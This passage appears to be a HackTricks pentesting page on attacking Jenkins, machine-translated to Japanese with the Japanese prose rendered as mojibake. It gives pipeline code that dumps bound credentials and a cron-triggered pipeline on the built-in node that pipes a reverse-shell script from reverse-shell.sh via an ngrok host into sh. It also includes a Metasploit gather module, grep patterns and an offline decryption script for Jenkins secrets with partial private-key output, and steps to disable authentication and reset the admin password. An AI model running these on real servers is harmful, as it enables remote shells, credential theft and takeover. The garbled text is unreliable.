ã‚‚ã†ä¸€ã¤ã®å•é¡Œã¯ã€ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®**envå†…ã®ç§˜å¯†ã‚’å–å¾—ã™ã‚‹**ã«ã¯ã€**ç§˜å¯†ã®åå‰ã¨ã‚¿ã‚¤ãƒ—ã‚’çŸ¥ã£ã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚‹**ã“ã¨ã§ã™ã€‚ãŸã¨ãˆã°ã€**`usernamePassword`** **ç§˜å¯†**ã‚’**`string`** **ç§˜å¯†**ã¨ã—ã¦**ãƒ­ãƒ¼ãƒ‰**ã—ã‚ˆã†ã¨ã™ã‚‹ã¨ã€ã“ã®**ã‚¨ãƒ©ãƒ¼**ãŒç™ºç”Ÿã—ã¾ã™ï¼š
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
ã“ã“ã§ã¯ã€ã„ãã¤ã‹ã®ä¸€èˆ¬çš„ãªç§˜å¯†ã®ã‚¿ã‚¤ãƒ—ã‚’ãƒ­ãƒ¼ãƒ‰ã™ã‚‹æ–¹æ³•ã‚’ç¤ºã—ã¾ã™ï¼š
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
ã“ã®ãƒšãƒ¼ã‚¸ã®æœ€å¾Œã«**ã™ã¹ã¦ã®èªè¨¼æƒ…å ±ã‚¿ã‚¤ãƒ—**ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
**ã™ã¹ã¦ã®ç§˜å¯†ã‚’ä¸€åº¦ã«ãƒ€ãƒ³ãƒ—ã™ã‚‹**æœ€è‰¯ã®æ–¹æ³•ã¯ã€**Jenkins**ãƒã‚·ãƒ³ã‚’**ä¾µå®³ã™ã‚‹**ã“ã¨ã§ã™ï¼ˆä¾‹ãˆã°ã€**çµ„ã¿è¾¼ã¿ãƒãƒ¼ãƒ‰**ã§ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’å®Ÿè¡Œã™ã‚‹ï¼‰ãã—ã¦ã€**ãƒã‚¹ã‚¿ãƒ¼ã‚­ãƒ¼**ã¨**æš—å·åŒ–ã•ã‚ŒãŸç§˜å¯†**ã‚’**æ¼æ´©**ã•ã›ã€ãã‚Œã‚‰ã‚’ã‚ªãƒ•ãƒ©ã‚¤ãƒ³ã§å¾©å·åŒ–ã—ã¾ã™ã€‚\
ã“ã‚Œã‚’è¡Œã†æ–¹æ³•ã«ã¤ã„ã¦ã¯ã€[ãƒãƒ¼ãƒ‰ã¨ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã‚»ã‚¯ã‚·ãƒ§ãƒ³](./#nodes-and-agents)ãŠã‚ˆã³[ãƒã‚¹ãƒˆã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã‚»ã‚¯ã‚·ãƒ§ãƒ³](./#post-exploitation)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚
{% endhint %}

### ãƒˆãƒªã‚¬ãƒ¼

[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers)ã‹ã‚‰: `triggers`ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã¯ã€**ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ãŒå†ãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã‚‹è‡ªå‹•åŒ–ã•ã‚ŒãŸæ–¹æ³•**ã‚’å®šç¾©ã—ã¾ã™ã€‚GitHubã‚„BitBucketãªã©ã®ã‚½ãƒ¼ã‚¹ã¨çµ±åˆã•ã‚ŒãŸãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®å ´åˆã€`triggers`ã¯å¿…è¦ãªã„ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ãªãœãªã‚‰ã€ã‚¦ã‚§ãƒ–ãƒ•ãƒƒã‚¯ãƒ™ãƒ¼ã‚¹ã®çµ±åˆãŒã™ã§ã«å­˜åœ¨ã™ã‚‹å¯èƒ½æ€§ãŒé«˜ã„ã‹ã‚‰ã§ã™ã€‚ç¾åœ¨åˆ©ç”¨å¯èƒ½ãªãƒˆãƒªã‚¬ãƒ¼ã¯`cron`ã€`pollSCM`ã€ãŠã‚ˆã³`upstream`ã§ã™ã€‚

Cronã®ä¾‹:
```bash
triggers { cron('H */4 * * 1-5') }
```
Check **other examples in the docs**.

### Nodes & Agents

A **Jenkins instance** might have **different agents running in different machines**. From an attacker perspective, access to different machines means **different potential cloud credentials** to steal or **different network access** that could be abuse to exploit other machines.

For more information check the basic information:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

You can enumerate the **configured nodes** in `/computer/`, you will usually find the **`Built-In Node`** (which is the node running Jenkins) and potentially more:

![](<../../.gitbook/assets/image (249).png>)

It is **ç‰¹ã«èˆˆå‘³æ·±ã„ã®ã¯Built-Inãƒãƒ¼ãƒ‰ã‚’å¦¥å”ã™ã‚‹ã“ã¨**ã§ã™ã€‚ãªãœãªã‚‰ã€ãã‚Œã«ã¯æ•æ„ŸãªJenkinsæƒ…å ±ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã‹ã‚‰ã§ã™ã€‚

To indicate you want to **run** the **pipeline** in the **built-in Jenkins node** you can specify inside the pipeline the following config:
```bash
pipeline {
agent {label 'built-in'}
```
### å®Œå…¨ãªä¾‹

ç‰¹å®šã®ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã§ã®ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã€cronãƒˆãƒªã‚¬ãƒ¼ã‚’ä½¿ç”¨ã—ã€ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã¨ã‚¹ãƒ†ãƒ¼ã‚¸ã®ç’°å¢ƒå¤‰æ•°ã‚’æŒã¡ã€ã‚¹ãƒ†ãƒƒãƒ—ã§2ã¤ã®å¤‰æ•°ã‚’èª­ã¿è¾¼ã¿ã€ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’é€ä¿¡ã—ã¾ã™:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## ä»»æ„ãƒ•ã‚¡ã‚¤ãƒ«èª­ã¿å–ã‚Šã‹ã‚‰RCEã¸

{% content-ref url="jenkins-arbitrary-file-read-to-rce-via-remember-me.md" %}
[jenkins-arbitrary-file-read-to-rce-via-remember-me.md](jenkins-arbitrary-file-read-to-rce-via-remember-me.md)
{% endcontent-ref %}

## RCE

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## ãƒã‚¹ãƒˆã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

`/credentials/` ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã§ã€ååˆ†ãªæ¨©é™ãŒã‚ã‚Œã°ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ãƒªã‚¹ãƒˆã§ãã¾ã™ã€‚ã“ã‚Œã¯ `credentials.xml` ãƒ•ã‚¡ã‚¤ãƒ«å†…ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®ã¿ã‚’ãƒªã‚¹ãƒˆã—ã¾ã™ãŒã€**ãƒ“ãƒ«ãƒ‰æ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«**ã«ã‚‚ **ã•ã‚‰ã«å¤šãã®è³‡æ ¼æƒ…å ±**ãŒå«ã¾ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

**å„ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã®æ§‹æˆã‚’è¡¨ç¤ºã§ãã‚‹**å ´åˆã€ãƒªãƒã‚¸ãƒˆãƒªã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ **è³‡æ ¼æƒ…å ±ï¼ˆã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆï¼‰ã®åå‰**ã‚„ **ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã®ä»–ã®è³‡æ ¼æƒ…å ±**ã‚‚ãã“ã«è¡¨ç¤ºã•ã‚Œã¾ã™ã€‚

![](<../../.gitbook/assets/image (180).png>)

#### From Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### From disk

ã“ã‚Œã‚‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯ **Jenkinsã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’å¾©å·åŒ–ã™ã‚‹ãŸã‚ã«å¿…è¦ã§ã™**ï¼š

* secrets/master.key
* secrets/hudson.util.Secret

ãã®ã‚ˆã†ãª **ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã¯é€šå¸¸æ¬¡ã®å ´æ‰€ã«ã‚ã‚Šã¾ã™**ï¼š

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

ã“ã‚Œã‚‰ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã®æ­£è¦è¡¨ç¾ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Jenkinsã®ç§˜å¯†ã‚’ã‚ªãƒ•ãƒ©ã‚¤ãƒ³ã§å¾©å·åŒ–ã™ã‚‹

**ç§˜å¯†ã‚’å¾©å·åŒ–ã™ã‚‹ãŸã‚ã«å¿…è¦ãªãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ãƒ€ãƒ³ãƒ—ã—ãŸå ´åˆ**ã€[**ã“ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆ**](https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py) **ã‚’ä½¿ç”¨ã—ã¦ãã‚Œã‚‰ã®ç§˜å¯†ã‚’å¾©å·åŒ–ã—ã¾ã™**ã€‚
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Groovyã‹ã‚‰Jenkinsã®ç§˜å¯†ã‚’å¾©å·åŒ–ã™ã‚‹
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### æ–°ã—ã„ç®¡ç†è€…ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã™ã‚‹

1. `/var/lib/jenkins/config.xml` ã¾ãŸã¯ `C:\Program Files (x86)\Jenkins\` ã«ã‚ã‚‹ Jenkins config.xml ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™ã€‚
2. `<useSecurity>true</useSecurity>`ã¨ã„ã†å˜èªã‚’æ¤œç´¢ã—ã€**`true`**ã‚’**`false`**ã«å¤‰æ›´ã—ã¾ã™ã€‚
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Jenkins** ã‚µãƒ¼ãƒãƒ¼ã‚’**å†èµ·å‹•**ã—ã¾ã™: `service jenkins restart`
4. ã‚‚ã†ä¸€åº¦ Jenkins ãƒãƒ¼ã‚¿ãƒ«ã«ç§»å‹•ã™ã‚‹ã¨ã€**Jenkins ã¯èªè¨¼æƒ…å ±ã‚’è¦æ±‚ã—ã¾ã›ã‚“**ã€‚**ç®¡ç† Jenkins**ã«ç§»å‹•ã—ã¦ã€**ç®¡ç†è€…ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å†è¨­å®š**ã—ã¾ã™ã€‚
5. è¨­å®šã‚’ `<useSecurity>true</useSecurity>` ã«å¤‰æ›´ã—ã¦ã€**å†åº¦ Jenkins ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’æœ‰åŠ¹ã«ã—**ã€**å†èµ·å‹•**ã—ã¾ã™ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’é€ä¿¡ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
